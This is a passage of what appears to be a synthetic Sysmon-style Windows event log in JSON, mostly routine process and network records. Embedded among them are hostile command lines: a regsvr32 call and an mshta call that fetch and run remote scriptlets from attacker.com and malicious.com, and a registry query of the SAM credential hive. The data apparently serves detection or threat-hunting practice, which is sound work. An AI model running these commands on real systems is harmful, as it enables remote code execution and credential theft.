      "Hashes": "SHA256=a9bf76d9188a36372c8fd3ae301c8d31ae76efb6db2aa41ee90db05bd69a5757"
    }
  },
  {
    "EventID": 3,
    "Computer": "WORKSTATION-01",
    "UtcTime": "2024-03-06T17:51:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\notepad.exe",
      "DestinationIp": "10.0.0.184",
      "DestinationPort": 80,
      "Protocol": "tcp",
      "Initiated": "true",
      "SourceIp": "10.0.0.52",
      "SourcePort": "62390"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-02",
    "UserName": "svc_backup",
    "UtcTime": "2024-03-17T16:41:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\conhost.exe",
      "CommandLine": "conhost.exe 0xffffffff -ForceV1",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\charlie",
      "ProcessId": "2471",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=2499ddd1c6ec85cc25e1b011abc119df0aaebc25c3bc3b107bd1749d3c771a8c"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-08",
    "UserName": "administrator",
    "UtcTime": "2024-03-17T13:33:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\svchost.exe",
      "CommandLine": "svchost.exe -k netsvcs -p -s Schedule",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\dave",
      "ProcessId": "8899",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=709272fac890e83699d9b63a991c8c2ffd0c146b8233c5f57b5820f5f2522ee6"
    }
  },
  {
    "EventID": 3,
    "Computer": "SERVER-02",
    "UtcTime": "2024-03-20T12:47:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\conhost.exe",
      "DestinationIp": "10.0.0.158",
      "DestinationPort": 80,
      "Protocol": "tcp",
      "Initiated": "true",
      "SourceIp": "10.0.0.81",
      "SourcePort": "57629"
    }
  },
  {
    "EventID": 3,
    "Computer": "WORKSTATION-08",
    "UtcTime": "2024-03-01T11:57:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\conhost.exe",
      "DestinationIp": "10.0.0.55",
      "DestinationPort": 443,
      "Protocol": "tcp",
      "Initiated": "true",
      "SourceIp": "10.0.0.108",
      "SourcePort": "52910"
    }
  },
  {
    "EventID": 1,
    "Computer": "DC-01",
    "UserName": "dave",
    "UtcTime": "2024-03-10T02:58:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\explorer.exe",
      "CommandLine": "explorer.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\bob",
      "ProcessId": "6176",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=f06312af08cb65821f128260ba57a77ea59eb2949664767650458c6f98e7a8df"
    }
  },
  {
    "EventID": 3,
    "Computer": "WORKSTATION-03",
    "UtcTime": "2024-03-04T18:17:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\explorer.exe",
      "DestinationIp": "10.0.0.151",
      "DestinationPort": 3389,
      "Protocol": "tcp",
      "Initiated": "true",
      "SourceIp": "10.0.0.78",
      "SourcePort": "60430"
    }
  },
  {
    "EventID": 3,
    "Computer": "SERVER-02",
    "UtcTime": "2024-03-19T19:10:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\svchost.exe",
      "DestinationIp": "10.0.0.75",
      "DestinationPort": 445,
      "Protocol": "tcp",
      "Initiated": "true",
      "SourceIp": "10.0.0.82",
      "SourcePort": "55478"
    }
  },
  {
    "EventID": 3,
    "Computer": "WORKSTATION-07",
    "UtcTime": "2024-03-09T10:45:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\notepad.exe",
      "DestinationIp": "10.0.0.2",
      "DestinationPort": 443,
      "Protocol": "tcp",
      "Initiated": "true",
      "SourceIp": "10.0.0.10",
      "SourcePort": "65408"
    }
  },
  {
    "EventID": 1,
    "Computer": "SERVER-02",
    "UserName": "bob",
    "UtcTime": "2024-03-13T15:31:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\wuauclt.exe",
      "CommandLine": "wuauclt.exe /UpdateDeploymentProvider",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\administrator",
      "ProcessId": "1644",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=3a70f601e024b44180dc81509923b15f58bf1856e1a520a0f8990ffff290bc8c"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-05",
    "UserName": "charlie",
    "UtcTime": "2024-03-21T22:07:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\notepad.exe",
      "CommandLine": "notepad.exe report.txt",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\bob",
      "ProcessId": "1309",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=77f0195253e804f4c2878172cc5acab6bc1362252047eab8c27fc878d805d1c3"
    }
  },
  {
    "EventID": 1,
    "Computer": "DC-01",
    "UserName": "bob",
    "UtcTime": "2024-03-28T00:05:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\explorer.exe",
      "CommandLine": "explorer.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\charlie",
      "ProcessId": "1087",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=de312060153f91d8e92dc49bf821f89002ecbfb31a2ebab873934b3f85c6d0fa"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-02",
    "UserName": "charlie",
    "UtcTime": "2024-03-10T04:24:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\wuauclt.exe",
      "CommandLine": "wuauclt.exe /UpdateDeploymentProvider",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\SYSTEM",
      "ProcessId": "8551",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=cf16e7f718823a50ad31be471b0d2ecd64890059c3007fdcfe8f5c2b4ba3fc3f"
    }
  },
  {
    "EventID": 1,
    "Computer": "DC-01",
    "UserName": "svc_backup",
    "UtcTime": "2024-03-18T22:23:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\conhost.exe",
      "CommandLine": "conhost.exe 0xffffffff -ForceV1",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\administrator",
      "ProcessId": "3618",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=e93e078b1e2ce430b146f0d3ca7fd7a23aed1c0cd3635754bc11886fdb6be0e3"
    }
  },
  {
    "EventID": 1,
    "Computer": "DC-01",
    "UserName": "bob",
    "UtcTime": "2024-03-06T19:31:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\conhost.exe",
      "CommandLine": "conhost.exe 0xffffffff -ForceV1",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\charlie",
      "ProcessId": "4420",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=49a95616002207b9ded038161110e8602e8ea0d5643ef9752d537984ca3bd852"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-01",
    "UserName": "SYSTEM",
    "UtcTime": "2024-03-02T14:17:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\taskhostw.exe",
      "CommandLine": "taskhostw.exe SYSTEM",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\dave",
      "ProcessId": "5473",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=bee9b046e0c25df30a746453fbfb8b6ce37df8168d8c89cd51d76bbe4edd8535"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-07",
    "UserName": "SYSTEM",
    "UtcTime": "2024-03-07T16:23:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\wuauclt.exe",
      "CommandLine": "wuauclt.exe /UpdateDeploymentProvider",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\administrator",
      "ProcessId": "8648",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=46f566177f9c966c9269a20e35a4854c5e7909a5822ba8591e11c754cd3fa26b"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-03",
    "UserName": "alice",
    "UtcTime": "2024-03-18T12:55:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\svchost.exe",
      "CommandLine": "svchost.exe -k netsvcs -p -s Schedule",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\administrator",
      "ProcessId": "4511",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=00e8e95d12c0283294ef19ad33272e6784dbc50ce18df41d67de5406c96d6ab6"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-01",
    "UserName": "dave",
    "UtcTime": "2024-03-10T06:31:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\svchost.exe",
      "CommandLine": "svchost.exe -k netsvcs -p -s Schedule",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\charlie",
      "ProcessId": "9384",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=e704b1d310d44443eaed1af72418f60d1bc8d8331891f71d39e955a47421c6e3"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-06",
    "UserName": "alice",
    "UtcTime": "2024-03-12T13:40:00Z",
    "EventData": {
      "Image": "C:\\Program Files\\Chrome\\chrome.exe",
      "CommandLine": "chrome.exe --type=renderer",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\bob",
      "ProcessId": "9748",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=f9749ccb306cd7657db902fbda6aabbbf2a855a94406fc95fcbc9c97152b33ce"
    }
  },
  {
    "EventID": 1,
    "Computer": "DC-01",
    "UserName": "charlie",
    "UtcTime": "2024-03-04T06:01:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\conhost.exe",
      "CommandLine": "conhost.exe 0xffffffff -ForceV1",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\alice",
      "ProcessId": "4684",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=c1cbd9c82561fc72406a048afd6d66cb336a36d70bfc7a5a6b7e863665d92c26"
    }
  },
  {
    "EventID": 1,
    "Computer": "DC-01",
    "UserName": "bob",
    "UtcTime": "2024-03-24T12:06:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\notepad.exe",
      "CommandLine": "notepad.exe report.txt",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\charlie",
      "ProcessId": "6653",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=4a59f291f5794044841388ae098933ee9a909342db9bed74c4dc44800bcff0b9"
    }
  },
  {
    "EventID": 3,
    "Computer": "WORKSTATION-08",
    "UtcTime": "2024-03-18T09:08:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\wuauclt.exe",
      "DestinationIp": "10.0.0.100",
      "DestinationPort": 3389,
      "Protocol": "tcp",
      "Initiated": "true",
      "SourceIp": "10.0.0.240",
      "SourcePort": "64590"
    }
  },
  {
    "EventID": 3,
    "Computer": "WORKSTATION-01",
    "UtcTime": "2024-03-05T20:33:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\notepad.exe",
      "DestinationIp": "10.0.0.89",
      "DestinationPort": 445,
      "Protocol": "tcp",
      "Initiated": "true",
      "SourceIp": "10.0.0.196",
      "SourcePort": "57155"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-01",
    "UserName": "svc_backup",
    "UtcTime": "2024-03-29T19:55:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\svchost.exe",
      "CommandLine": "svchost.exe -k netsvcs -p -s Schedule",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\alice",
      "ProcessId": "3457",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=09bf986fa1861a3db4fa5e361dbc3c92f623b9d8ca4f153763fe0c78d22e9f2f"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-07",
    "UserName": "SYSTEM",
    "UtcTime": "2024-03-28T21:29:00Z",
    "EventData": {
      "Image": "C:\\Program Files\\Windows Defender\\MsMpEng.exe",
      "CommandLine": "MsMpEng.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\bob",
      "ProcessId": "2448",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=542aec17094f98508342dd17ee8699c36e59bf72c81f3d752d35b96519fbef11"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-01",
    "UserName": "alice",
    "UtcTime": "2024-03-01T11:49:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\regsvr32.exe",
      "CommandLine": "regsvr32.exe /u /s /i:http://attacker.com/payload.sct scrobj.dll",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\SYSTEM",
      "ProcessId": "9050",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=fc38c8c52f8ef57f9b4ca7a6db12cefdaa66c99b26fdd5127607fdf5e09da1df"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-08",
    "UserName": "bob",
    "UtcTime": "2024-03-27T18:50:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\wuauclt.exe",
      "CommandLine": "wuauclt.exe /UpdateDeploymentProvider",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\charlie",
      "ProcessId": "9636",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=562a505e600d8e68603346c9719768675e548d1d2aaf718405134d03e59ec1ad"
    }
  },
  {
    "EventID": 3,
    "Computer": "WORKSTATION-07",
    "UtcTime": "2024-03-27T11:02:00Z",
    "EventData": {
      "Image": "C:\\Program Files\\Windows Defender\\MsMpEng.exe",
      "DestinationIp": "10.0.0.78",
      "DestinationPort": 3389,
      "Protocol": "tcp",
      "Initiated": "true",
      "SourceIp": "10.0.0.129",
      "SourcePort": "62905"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-07",
    "UserName": "svc_backup",
    "UtcTime": "2024-03-17T18:44:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\taskhostw.exe",
      "CommandLine": "taskhostw.exe SYSTEM",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\charlie",
      "ProcessId": "7009",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=dcd14e38f59a37d9601f26f19785f6c7aa928e491fc9168aa0b660ec9e1eca5a"
    }
  },
  {
    "EventID": 1,
    "Computer": "DC-01",
    "UserName": "administrator",
    "UtcTime": "2024-03-08T02:15:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\notepad.exe",
      "CommandLine": "notepad.exe report.txt",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\bob",
      "ProcessId": "6574",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=c718db033c345798c1e9c1bd6a89af15b9306cd92261d93262871bd9def74fca"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-06",
    "UserName": "bob",
    "UtcTime": "2024-03-12T13:08:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\explorer.exe",
      "CommandLine": "explorer.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\dave",
      "ProcessId": "1421",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=067af013c679245841e93c032ebe395def9a1afb4ae0c846826d7052e40fb92a"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-04",
    "UserName": "alice",
    "UtcTime": "2024-03-16T14:10:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\notepad.exe",
      "CommandLine": "notepad.exe report.txt",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\administrator",
      "ProcessId": "4633",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=03392570993ac532650c375e3d54066d117a7f34d4ed7eeffb18bd7a8fa64b22"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-05",
    "UserName": "alice",
    "UtcTime": "2024-03-07T02:02:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\explorer.exe",
      "CommandLine": "explorer.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\SYSTEM",
      "ProcessId": "1813",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=d003cf44a4c19de8f1c283e4b2e3229df54e6bb7b56fd37f87ab5f8025811f16"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-07",
    "UserName": "administrator",
    "UtcTime": "2024-03-17T05:22:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\explorer.exe",
      "CommandLine": "explorer.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\dave",
      "ProcessId": "6120",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=6cdcbaac72987932675894026da7546da82fe20fc31116c7c4fa58e52dc3f9a5"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-03",
    "UserName": "charlie",
    "UtcTime": "2024-03-07T09:55:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\explorer.exe",
      "CommandLine": "explorer.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\svc_backup",
      "ProcessId": "1885",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=05da04f9ea1a09953c5652d32cede1daa06673e838fb4f3793d4c2dd7c0890eb"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-02",
    "UserName": "alice",
    "UtcTime": "2024-03-17T06:01:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\wuauclt.exe",
      "CommandLine": "wuauclt.exe /UpdateDeploymentProvider",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\SYSTEM",
      "ProcessId": "9410",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=193c6a33ed62b0d41f701376b8c728b4b642dea211d10c1b25de4d1468419dcc"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-05",
    "UserName": "bob",
    "UtcTime": "2024-03-22T04:14:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\conhost.exe",
      "CommandLine": "conhost.exe 0xffffffff -ForceV1",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\alice",
      "ProcessId": "3464",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=0d33b72d7f72b79986eed2d2ab118b23084ecfd38f2dc75cbf81bc177afdc398"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-01",
    "UserName": "bob",
    "UtcTime": "2024-03-01T11:34:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\mshta.exe",
      "CommandLine": "mshta.exe javascript:a=GetObject('script:http://malicious.com/vbs.sct').Exec();close()",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\administrator",
      "ProcessId": "5400",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=021c180aaf8b0faeb79bbd8d658945dbe02fdd466ba17095d551b5d2f7433fea"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-07",
    "UserName": "dave",
    "UtcTime": "2024-03-03T12:25:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\wuauclt.exe",
      "CommandLine": "wuauclt.exe /UpdateDeploymentProvider",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\svc_backup",
      "ProcessId": "1406",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=4113b70e21dd449f4dcf8abc1950b3984e2a4195d89994cfc7eb663e6e4af706"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-05",
    "UserName": "svc_backup",
    "UtcTime": "2024-03-12T14:35:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\taskhostw.exe",
      "CommandLine": "taskhostw.exe SYSTEM",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\charlie",
      "ProcessId": "1357",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=9106c2ed61af13dfea18fef1fe9f86c2dc30840e839798414be53b76fc35022c"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-02",
    "UserName": "SYSTEM",
    "UtcTime": "2024-03-01T10:35:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\reg.exe",
      "CommandLine": "reg query HKLM\\SAM",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\dave",
      "ProcessId": "2382",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=9668648922dee0a6d65a4fb4b92f9edab58b7ffaf147c73304ba187c9a316880"
    }
  },
  {
    "EventID": 4624,
    "Computer": "WORKSTATION-04",
    "UserName": "SYSTEM",
    "UtcTime": "2024-03-29T03:12:00Z",
    "EventData": {
      "SubjectUserName": "svc_backup",
      "SubjectDomainName": "CORP"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-08",
    "UserName": "svc_backup",
    "UtcTime": "2024-03-09T08:22:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\taskhostw.exe",
      "CommandLine": "taskhostw.exe SYSTEM",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\SYSTEM",
      "ProcessId": "8711",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=289db53f5b96b9cf582a642d4f8933ce8165a6ef55fecb9ad30334df6866ccdf"
    }
  },
